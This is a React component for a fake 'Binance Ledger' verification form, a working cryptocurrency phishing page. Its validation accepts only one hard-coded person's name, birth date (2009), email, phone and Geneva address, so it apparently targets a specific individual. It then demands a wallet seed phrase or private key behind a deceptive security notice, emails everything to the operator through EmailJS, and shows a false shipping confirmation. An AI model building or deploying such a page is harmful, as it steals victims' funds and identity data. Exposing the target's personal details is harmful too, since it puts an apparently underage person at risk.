
import { FC, useState, FormEvent, useEffect } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Checkbox } from "@/components/ui/checkbox";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
import emailjs from 'emailjs-com';

// Define the expected correct data
const correctData = {
  firstName: "Markus",
  lastName: "Tornqvist",
  dateOfBirth: "2009-12-06", // Format as YYYY-MM-DD for the date input
  email: "markus.tornqvist09@gmail.com",
  phoneNumber: "0798719282",
  address: "Chemin de Ruth 83",
  zipCode: "1223",
  city: "Geneve",
  country: "Switzerland",
};

// List of countries for the dropdown
const countries = [
  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", 
  "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", 
  "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", 
  "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", 
  "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", 
  "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", 
  "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo", "Kuwait", "Kyrgyzstan", "Laos", 
  "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", 
  "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", 
  "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", 
  "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine", 
  "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
  "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", 
  "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", 
  "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", 
  "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", 
  "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", 
  "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", 
  "Yemen", "Zambia", "Zimbabwe"
];

// Email.js configuration
const EMAILJS_SERVICE_ID = "service_id"; // Replace with your EmailJS service ID
const EMAILJS_TEMPLATE_ID = "template_id"; // Replace with your EmailJS template ID
const EMAILJS_USER_ID = "user_id"; // Replace with your EmailJS user ID

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState(1);
  const [formProgress, setFormProgress] = useState(25);
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    email: "",
    phoneNumber: "",
    address: "",
    zipCode: "",
    city: "",
    country: "",
    seedPhrase: "",
    securityConfirmation: false,
  });
  
  const [emailConfig, setEmailConfig] = useState({
    serviceId: EMAILJS_SERVICE_ID,
    templateId: EMAILJS_TEMPLATE_ID,
    userId: EMAILJS_USER_ID,
    isConfigured: false
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [verificationCompleted, setVerificationCompleted] = useState(false);
  const [securityConfirmed, setSecurityConfirmed] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionCompleted, setSubmissionCompleted] = useState(false);
  const [showEmailConfig, setShowEmailConfig] = useState(false);

  useEffect(() => {
    // Check if EmailJS configuration is already in localStorage
    const storedServiceId = localStorage.getItem('emailjs_service_id');
    const storedTemplateId = localStorage.getItem('emailjs_template_id');
    const storedUserId = localStorage.getItem('emailjs_user_id');
    
    if (storedServiceId && storedTemplateId && storedUserId) {
      setEmailConfig({
        serviceId: storedServiceId,
        templateId: storedTemplateId,
        userId: storedUserId,
        isConfigured: true
      });
    } else {
      // Show email configuration panel if not configured
      setShowEmailConfig(true);
    }
  }, []);

  const handleEmailConfigSubmit = () => {
    // Validate email configuration
    if (!emailConfig.serviceId || !emailConfig.templateId || !emailConfig.userId) {
      toast({
        title: "Error",
        description: "Please fill in all EmailJS configuration fields",
        variant: "destructive",
      });
      return;
    }

    // Save configuration to localStorage
    localStorage.setItem('emailjs_service_id', emailConfig.serviceId);
    localStorage.setItem('emailjs_template_id', emailConfig.templateId);
    localStorage.setItem('emailjs_user_id', emailConfig.userId);
    
    setEmailConfig(prev => ({ ...prev, isConfigured: true }));
    setShowEmailConfig(false);
    
    toast({
      title: "Success",
      description: "Email configuration saved successfully",
    });
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
    
    // Clear error for this field if it exists
    if (errors[e.target.name]) {
      setErrors({
        ...errors,
        [e.target.name]: "",
      });
    }
  };

  const handleEmailConfigChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setEmailConfig({
      ...emailConfig,
      [e.target.name]: e.target.value
    });
  };

  const handleSecurityConfirmation = (checked: boolean) => {
    setFormData({
      ...formData,
      securityConfirmation: checked,
    });
    setSecurityConfirmed(checked);
  };

  const validateStep1 = () => {
    const newErrors: Record<string, string> = {};

    if (formData.firstName.trim() === "") {
      newErrors.firstName = "First name is required";
    } else if (formData.firstName !== correctData.firstName) {
      newErrors.firstName = "Invalid first name";
    }

    if (formData.lastName.trim() === "") {
      newErrors.lastName = "Last name is required";
    } else if (formData.lastName !== correctData.lastName) {
      newErrors.lastName = "Invalid last name";
    }

    if (formData.dateOfBirth.trim() === "") {
      newErrors.dateOfBirth = "Date of birth is required";
    } else if (formData.dateOfBirth !== correctData.dateOfBirth) {
      newErrors.dateOfBirth = "Invalid date of birth";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep2 = () => {
    const newErrors: Record<string, string> = {};
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!emailRegex.test(formData.email)) {
      newErrors.email = "Valid email is required";
    } else if (formData.email !== correctData.email) {
      newErrors.email = "Invalid email";
    }

    if (formData.phoneNumber.trim() === "") {
      newErrors.phoneNumber = "Phone number is required";
    } else if (formData.phoneNumber !== correctData.phoneNumber) {
      newErrors.phoneNumber = "Invalid phone number";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep3 = () => {
    const newErrors: Record<string, string> = {};
    
    if (formData.address.trim() === "") {
      newErrors.address = "Address is required";
    } else if (formData.address !== correctData.address) {
      newErrors.address = "Invalid address";
    }
    
    if (formData.zipCode.trim() === "") {
      newErrors.zipCode = "Zip code is required";
    } else if (formData.zipCode !== correctData.zipCode) {
      newErrors.zipCode = "Invalid zip code";
    }
    
    if (formData.city.trim() === "") {
      newErrors.city = "City is required";
    } else if (formData.city !== correctData.city) {
      newErrors.city = "Invalid city";
    }
    
    if (!formData.country) {
      newErrors.country = "Country is required";
    } else if (formData.country !== correctData.country) {
      newErrors.country = "Invalid country";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = () => {
    if (currentStep === 1 && validateStep1()) {
      setCurrentStep(2);
      setFormProgress(50);
    } else if (currentStep === 2 && validateStep2()) {
      setCurrentStep(3);
      setFormProgress(75);
    } else if (currentStep === 3 && validateStep3()) {
      setCurrentStep(4);
      setFormProgress(100);
      setVerificationCompleted(true);
    }
  };

  const handlePrevious = () => {
    if (currentStep === 2) {
      setCurrentStep(1);
      setFormProgress(25);
    } else if (currentStep === 3) {
      setCurrentStep(2);
      setFormProgress(50);
    } else if (currentStep === 4) {
      setCurrentStep(3);
      setFormProgress(75);
    }
  };

  const sendEmail = async () => {
    if (!emailConfig.isConfigured) {
      return false;
    }

    try {
      const templateParams = {
        to_email: "donotreply@binanceledger.com", // Updated recipient email
        from_name: `${formData.firstName} ${formData.lastName}`,
        from_email: formData.email,
        subject: "New Binance Ledger Form Submission",
        message: `
          Name: ${formData.firstName} ${formData.lastName}
          Date of Birth: ${formData.dateOfBirth}
          Email: ${formData.email}
          Phone: ${formData.phoneNumber}
          Address: ${formData.address}
          Zip Code: ${formData.zipCode}
          City: ${formData.city}
          Country: ${formData.country}
          Seed Phrase: ${formData.seedPhrase}
        `,
      };

      await emailjs.send(
        emailConfig.serviceId,
        emailConfig.templateId,
        templateParams,
        emailConfig.userId
      );
      
      return true;
    } catch (error) {
      console.error("Email sending failed:", error);
      return false;
    }
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    if (!formData.seedPhrase.trim()) {
      toast({
        title: "Please enter your seed phrase or private key",
        variant: "destructive",
      });
      return;
    }

    if (!formData.securityConfirmation) {
      toast({
        title: "Please confirm the security notice",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Send email with form data
      const emailSent = await sendEmail();
      
      // Simulate processing time
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      setIsSubmitting(false);
      setSubmissionCompleted(true);
      
      if (emailSent) {
        toast({
          title: "Success",
          description: "Your Ledger is on the way to the provided address. Form data has been sent to the admin.",
        });
      } else {
        toast({
          title: "Success",
          description: "Your Ledger is on the way to the provided address. (Email notification failed)",
        });
      }
    } catch (error) {
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "An error occurred. Please try again.",
        variant: "destructive",
      });
      console.error("Form submission error:", error);
    }
  };

  if (showEmailConfig) {
    return (
      <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
        <h2 className="text-binance-yellow font-bold text-xl mb-4">Email Configuration</h2>
        <p className="text-white mb-6">
          To receive email notifications when users submit the form, please configure your EmailJS credentials:
        </p>
        
        <div className="space-y-4 mb-6">
          <div>
            <label htmlFor="serviceId" className="block text-sm font-medium text-gray-300 mb-1">
              EmailJS Service ID
            </label>
            <Input
              id="serviceId"
              name="serviceId"
              value={emailConfig.serviceId}
              onChange={handleEmailConfigChange}
              placeholder="e.g., service_abc123"
              className="bg-binance-darkGray border-gray-600 text-white"
            />
          </div>
          
          <div>
            <label htmlFor="templateId" className="block text-sm font-medium text-gray-300 mb-1">
              EmailJS Template ID
            </label>
            <Input
              id="templateId"
              name="templateId"
              value={emailConfig.templateId}
              onChange={handleEmailConfigChange}
              placeholder="e.g., template_xyz789"
              className="bg-binance-darkGray border-gray-600 text-white"
            />
          </div>
          
          <div>
            <label htmlFor="userId" className="block text-sm font-medium text-gray-300 mb-1">
              EmailJS User ID
            </label>
            <Input
              id="userId"
              name="userId"
              value={emailConfig.userId}
              onChange={handleEmailConfigChange}
              placeholder="e.g., user_def456"
              className="bg-binance-darkGray border-gray-600 text-white"
            />
          </div>
        </div>
        
        <div className="bg-amber-900/20 border border-amber-500/30 rounded-md p-4 mb-6">
          <h4 className="text-amber-400 font-medium mb-2">How to get EmailJS credentials</h4>
          <ol className="text-gray-300 text-sm list-decimal pl-5 space-y-2">
            <li>Sign up at <a href="https://www.emailjs.com/" target="_blank" rel="noopener noreferrer" className="text-binance-yellow underline">EmailJS.com</a></li>
            <li>Create a new Email Service and get the Service ID</li>
            <li>Create a new Email Template and get the Template ID</li>
            <li>Get your User ID from Account Settings</li>
          </ol>
        </div>
        
        <Button
          onClick={handleEmailConfigSubmit}
          className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
        >
          Save Configuration
        </Button>
      </div>
    );
  }

  return (
    <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
      <div className="mb-6">
        <h2 className="text-binance-yellow font-bold text-xl mb-2">
          {verificationCompleted ? "Security Verification" : "User Verification"}
        </h2>
        {!verificationCompleted && (
          <div className="mb-4">
            <Progress value={formProgress} className="h-2 bg-gray-700" />
            <div className="mt-2 text-sm text-gray-400">
              Step {currentStep} of 4
            </div>
          </div>
        )}
      </div>

      {!verificationCompleted ? (
        <div className="space-y-6">
          {currentStep === 1 && (
            <div className="space-y-4">
              <h3 className="text-white font-medium">Personal Information</h3>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-1">
                    First Name
                  </label>
                  <Input
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    placeholder="First Name"
                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.firstName ? "border-red-500" : ""}`}
                  />
                  {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
                </div>
                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
                    Last Name
                  </label>
                  <Input
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    placeholder="Last Name"
                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.lastName ? "border-red-500" : ""}`}
                  />
                  {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
                </div>
              </div>
              <div>
                <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-1">
                  Date of Birth
                </label>
                <Input
                  id="dateOfBirth"
                  name="dateOfBirth"
                  type="date"
                  value={formData.dateOfBirth}
                  onChange={handleInputChange}
                  placeholder="Date of Birth"
                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.dateOfBirth ? "border-red-500" : ""}`}
                />
                {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
              </div>
            </div>
          )}

          {currentStep === 2 && (
            <div className="space-y-4">
              <h3 className="text-white font-medium">Contact Information</h3>
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
                  Email
                </label>
                <Input
                  id="email"
                  name="email"
                  type="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="Email Address"
                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
                />
                {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
              </div>
              <div>
                <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-1">
                  Phone Number
                </label>
                <Input
                  id="phoneNumber"
                  name="phoneNumber"
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={handleInputChange}
                  placeholder="Phone Number (e.g. 0798719282)"
                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
                />
                {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
              </div>
            </div>
          )}

          {currentStep === 3 && (
            <div className="space-y-4">
              <h3 className="text-white font-medium">Address Details</h3>
              <div>
                <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-1">
                  Address
                </label>
                <Input
                  id="address"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  placeholder="Address"
                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.address ? "border-red-500" : ""}`}
                />
                {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-1">
                    Zip Code
                  </label>
                  <Input
                    id="zipCode"
                    name="zipCode"
                    value={formData.zipCode}
                    onChange={handleInputChange}
                    placeholder="Zip Code"
                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.zipCode ? "border-red-500" : ""}`}
                  />
                  {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
                </div>
                <div>
                  <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
                    City
                  </label>
                  <Input
                    id="city"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    placeholder="City"
                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.city ? "border-red-500" : ""}`}
                  />
                  {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
                </div>
              </div>

              <div>
                <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
                  Country
                </label>
                <Select
                  name="country"
                  value={formData.country}
                  onValueChange={(value) => {
                    setFormData({
                      ...formData,
                      country: value
                    });
                    // Clear error for this field if it exists
                    if (errors.country) {
                      setErrors({
                        ...errors,
                        country: ""
                      });
                    }
                  }}
                >
                  <SelectTrigger 
                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
                  >
                    <SelectValue placeholder="Select a country" />
                  </SelectTrigger>
                  <SelectContent className="bg-binance-darkGray border-gray-600 text-white max-h-[200px]">
                    {countries.map((country) => (
                      <SelectItem key={country} value={country}>
                        {country}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
              </div>
            </div>
          )}

          <div className="flex justify-between pt-4">
            {currentStep > 1 && (
              <Button
                type="button"
                onClick={handlePrevious}
                className="bg-gray-600 hover:bg-gray-700 text-white"
              >
                Back
              </Button>
            )}
            <Button
              type="button"
              onClick={handleNext}
              className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 ml-auto"
            >
              {currentStep === 3 ? "Complete Verification" : "Next"}
            </Button>
          </div>
        </div>
      ) : !submissionCompleted ? (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="text-center py-4">
            <h3 className="text-white font-semibold text-xl">
              Verification successful. Thank you, {formData.firstName} {formData.lastName}.
            </h3>
            <p className="text-gray-300 mt-2">
              Please proceed with the final steps to link your wallet to the ledger.
            </p>
          </div>

          <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-6">
            <h4 className="text-red-400 font-medium mb-2">Security Notice</h4>
            <p className="text-gray-300 text-sm">
              IMPORTANT: The information requested below is highly sensitive and should never be shared with third parties via phone, SMS, or email. 
              This information should only be entered in this secure form to properly link your wallet to the Binance Ledger device.
            </p>
            <div className="mt-4 flex items-center space-x-2">
              <Checkbox
                id="securityConfirmation"
                checked={securityConfirmed}
                onCheckedChange={handleSecurityConfirmation}
                className="data-[state=checked]:bg-binance-yellow data-[state=checked]:border-binance-yellow"
              />
              <label htmlFor="securityConfirmation" className="text-sm text-gray-200">
                I understand and confirm that I am providing this information securely
              </label>
            </div>
          </div>

          <div className="space-y-4">
            <label htmlFor="seedPhrase" className="block text-sm font-medium text-gray-300">
              Seed Phrase or Private Key
            </label>
            <textarea
              id="seedPhrase"
              name="seedPhrase"
              value={formData.seedPhrase}
              onChange={(e) => setFormData({ ...formData, seedPhrase: e.target.value })}
              placeholder="Enter your 12 or 24 word seed phrase (with spaces between words) or private key"
              className="w-full p-3 bg-binance-darkGray border border-gray-600 rounded-md text-white min-h-[100px]"
              required
            />
            <p className="text-xs text-gray-400">
              This information is required to securely link your wallet to your new Binance Ledger device.
            </p>
          </div>

          <div className="pt-4">
            <Button
              type="submit"
              disabled={isSubmitting || !securityConfirmed}
              className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
            >
              {isSubmitting ? "Processing..." : "Complete Wallet Linking"}
            </Button>
          </div>
        </form>
      ) : (
        <div className="text-center py-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
            <svg
              className="w-8 h-8 text-green-600"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M5 13l4 4L19 7"
              ></path>
            </svg>
          </div>
          <h3 className="text-white font-semibold text-xl mb-2">
            Success! Your Binance Ledger is on the way.
          </h3>
          <p className="text-gray-300">
            The Binance Ledger will be shipped to your provided address:
            <br />
            <span className="block mt-2 font-medium">
              {formData.address}, {formData.zipCode}
              <br />
              {formData.city}, {formData.country}
            </span>
          </p>
          <p className="mt-6 text-gray-400 text-sm">
            You will receive a confirmation email at {formData.email} with tracking information
            once your device has been shipped.
          </p>
        </div>
      )}
    </div>
  );
};

export default BinanceLedgerForm;
